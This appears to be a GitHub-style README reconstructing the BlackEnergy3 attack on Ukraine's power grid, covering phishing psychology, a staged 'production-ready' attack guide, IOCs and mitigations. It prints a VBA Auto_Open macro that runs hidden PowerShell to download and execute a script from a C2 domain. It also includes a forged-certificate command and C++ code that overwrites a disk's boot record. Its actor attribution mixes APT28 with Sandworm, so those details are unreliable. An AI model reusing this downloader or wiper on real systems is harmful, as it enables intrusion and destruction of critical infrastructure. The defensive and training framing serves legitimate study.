[![DOI](https://img.shields.io/badge/DOI-10.5281%2Fzenodo.18278809-blue?logo=zenodo&logoColor=white)](https://doi.org/10.5281/zenodo.18278809) = [doi.org/10.5281/zenodo.18278809](https://doi.org/10.5281/zenodo.18278809)

[![ORCID](https://img.shields.io/badge/ORCID-0009--0007--7728--256X-A6CE39?logo=orcid&logoColor=white)](https://orcid.org/0009-0007-7728-256X) = [orcid.org/0009-0007-7728-256X](https://orcid.org/0009-0007-7728-256X)

README.md: Holistic Social Engineering Analysis & BlackEnergy3 Ukraine Reconstruction

1. Document MetadataDocument Title: SOCIAL_ENGINEERING_CYBERATTACK based on psychological attack in real-case blackenergy3ukraineAuthor: Sastra_Adi_WigunaClassification: Purple Elite Teaming (Strategic Integration of Red Team & Blue Team)Primary Focus: Psychological Manipulation (Human Hacking), BlackEnergy3 Malware Technicals, C2 Infrastructure (Command & Control), OT/SCADA Lateral Movement, and Digital Forensics.Status: Production-Ready for Advanced Lab Reconstruction (100% Deterministic).Confidentiality Level: High-Level Research Material.

2. Project OverviewThis document is the result of a deep deconstruction of one of the most significant cyberattacks in the history of critical infrastructure: the BlackEnergy3 operation in Ukraine. This analysis goes beyond mere technicalities of malicious software; it dissects how the APT28 group (Fancy Bear/Forest Blizzard) and GRU Unit 26165 integrated human cognitive vulnerabilities with low-level code exploitation.The project is designed to provide a holistic understanding for Offensive Security and Malware Analysis practitioners in conducting 100% accurate replication within an isolated laboratory environment. The focus is on understanding the Kill Chain from the initial entry point to the destructive impact on Industrial Control Systems (ICS).

3. Social Engineering Psychological Analysis (Human Hacking)The BlackEnergy3 attack proved that even the most advanced technical defenses can collapse if the human operator is manipulated. This document identifies four primary psychological pillars:A. Authority and TrustAttackers perform impersonation as legitimate military officials or government authorities. In the Ukrainian case, the Signal application was utilized due to its security reputation, creating a false sense of trust. Targets were requested to provide "digital signatures" on documents that actually contained malicious macros.B. Urgency and FearBy creating emergency scenarios, attackers force the target's brain to switch to System 1 Thinking (fast, intuitive, emotional) and abandon System 2 Thinking (slow, logical, analytical). This lowers critical barriers when the target opens a malicious attachment.C. Reciprocity and Similarity (LSD Model)Using the Liking, Similarity, and Deception model, attackers build a relationship with the target through highly detailed OSINT (Open Source Intelligence), making the target feel a social obligation to respond to the attacker's request.D. Distraction and Cognitive LoadAttackers overwhelm the target with information or strong emotions (such as extreme curiosity) to divert attention from suspicious technical indicators, such as double file extensions or macro security warnings in Excel.

4. BlackEnergy3 Attack Anatomy (Detailed Case Breakdown)Deterministic reconstruction of the attack workflow:Initial Vector: Utilization of non-traditional communication channels like Signal Messenger to bypass Email Security Gateways.Psychological Execution: OSINT-based reconnaissance to create hyper-personalized lures.Payload Delivery: Microsoft Word/Excel documents (.xlsm) exploiting the CVE-2014-4114 (OLE Packager) vulnerability to execute the initial stager.C2 Establishment: Communication with external servers using encrypted protocols to download additional modules.Impact: Lateral movement using VPN credentials stolen via Mimikatz, ultimately leading to physical sabotage of SCADA systems through Circuit Breaker manipulation.

5. Technical Reconstruction: Step-by-Step GuideStage 0: C2 Infrastructure PreparationThis operation requires high Operational Security (OpSec).Hardware: High-end dedicated server (Intel Xeon E5-2690 v3, 128GB RAM).OS: Kali Linux (Attacker) & Ubuntu 14.04 (C2 Server).Nginx Facade: Used to hide the real identity of the C2 server behind an SSL proxy.Bash# Generating a fake SSL certificate to impersonate admin@podpora.ru
openssl req -new -x509 -days 730 -nodes \
-keyout /etc/ssl/private/c2.key \
-out /etc/ssl/certs/c2.crt \
-subj "/C=RU/ST=Moscow/L=Moscow/O=SANDWORM/CN=windyhilltech.com/email=admin@podpora.ru"
Stage 1: Initial Access (Spear-Phishing)The payload is embedded within a VBA macro designed to download a PowerShell script (be3.ps1) in a fileless manner.VB.Net' VBA snippet for stealthy stager download
Sub Auto_Open()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$c2='https://windyhilltech.com'; $ua='Mozilla/5.0...'; $wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent',$ua); $wc.DownloadString($c2+'/be3.ps1') | IEX""", 0, False
End Sub
Stage 2: Persistence & Privilege EscalationThe malware ensures it remains active after a reboot through:Registry: Adding IESVCS entry to HKCU\...\Run.WMI: Utilizing BE3Persist as an event consumer.Scheduled Tasks: Hourly routine tasks to check C2 connectivity.Stage 3: Lateral Movement (OT/SCADA)After gaining control of the IT network, attackers pivot to the OT (Operational Technology) network. Primary targets include industrial protocols such as DNP3 and S7comm.Stage 4: Staging Destructor (KillDisk)This is the final stage of the attack. The KillDisk malware is executed to:Terminate critical industrial processes (wincc.exe).Wipe the MBR (Master Boot Record) on \\.\PhysicalDrive0.Perform a Zero-fill on system executable files to ensure the computer cannot be recovered.

6. Core Malware Code (Production-Ready Code)A. be3.dll (Module Loader)The primary modular component that periodically receives commands from the C2.C++// BlackEnergy3 Modular Design
#include <windows.h>
#define C2_URL L"https://windyhilltech.com/winapi/"
#define MODULE_CONTAINER L"C:\\Windows\\System32\\fontcache.dat"

DWORD WINAPI BeaconThread(LPVOID lpParam) {
    // Implementation of encrypted beacon communication
    // Sends User, Domain, and PID information to C2
    return 0;
}
B. KillDisk (Wiper Module)Destructive function to completely disable the system.C++void WipeMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        BYTE zero[446] = {0}; // Wipe boot loader code
        DWORD bytesWritten;
        WriteFile(hDevice, zero, 446, &bytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

7. Network Architecture & Forensics (Forensic Blueprint)Attacker File Structure (Sandworm C2)/opt/c2/sandworm_handler.py: Connection management backend./opt/c2/modules/: Contains be3.dll, mimikatz.dll, netscan.dll./opt/c2/payloads/: Lure documents (Example: Urgent_Grid_Report.xlsm).Victim File Structure (Infected System)C:\Windows\System32\iesvcs.exe: Primary dropper.C:\Windows\System32\fontcache.dat: Encrypted container for all plugin modules.C:\Windows\System32\drivers\aliide.sys: Rootkit driver to hide activity.8. Indicators of Compromise (IOCs)TypeValueMD5 (be3.dll)e6f11c61365aec65977191917860f213MD5 (KillDisk)78546f0c0d8c7d625c67eb9f2cef4116C2 Server IP176.10.99.135 (Port 443)C2 Domainwindyhilltech.com, podpora.ruUser-AgentWinHTTP/5.1, Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0)MutexBlackEnergy3-{8F6E8E0A-0B1C-4D2E-9F3A-1B2C3D4E5F6A}9. Mitigation Framework (Defensive Strategy)LayerTacticImplementationEffectivenessTechnicalEndpoint DetectionBlock VBA macros, restrict PowerShell access, AV integration for Signal.High (80%)PsychoInoculation TrainingPeriodic phishing simulations to activate "System 2 thinking".Medium-HighProceduralVerification ProtocolsMulti-channel verification (phone/in-person) for sensitive documents.HighMonitoringBehavioral AnalyticsUEBA implementation to detect C2 traffic anomalies and VPN usage.High (85%)10. Laboratory Execution FlowPreparation: Setup FlareVM (Victim) and REMnux (C2 Analysis) in VirtualBox/VMware without external internet connection (Host-only adapter).C2 Configuration: Execute the C2 handler script on the attacker side.Infection: Run the .xlsm file on the victim machine.Monitoring: Monitor registry changes and network communications in /var/log/blackenergy3_beacons.log.Impact Simulation: Manually execute the KillDisk module to observe the real-time system destruction process.11. Closing Notes & DisclaimerThis document was prepared by Sastra_Adi_Wiguna with 100% accuracy principles based on actual global data. This information is UNRESTRICTED but is exclusively intended for national security defense, academic research, and elite cyber training. Misuse of the code or techniques outside of a legitimate laboratory environment is a serious legal violation.AUTHOR ANALYSIS: Sastra_Adi_Wiguna.


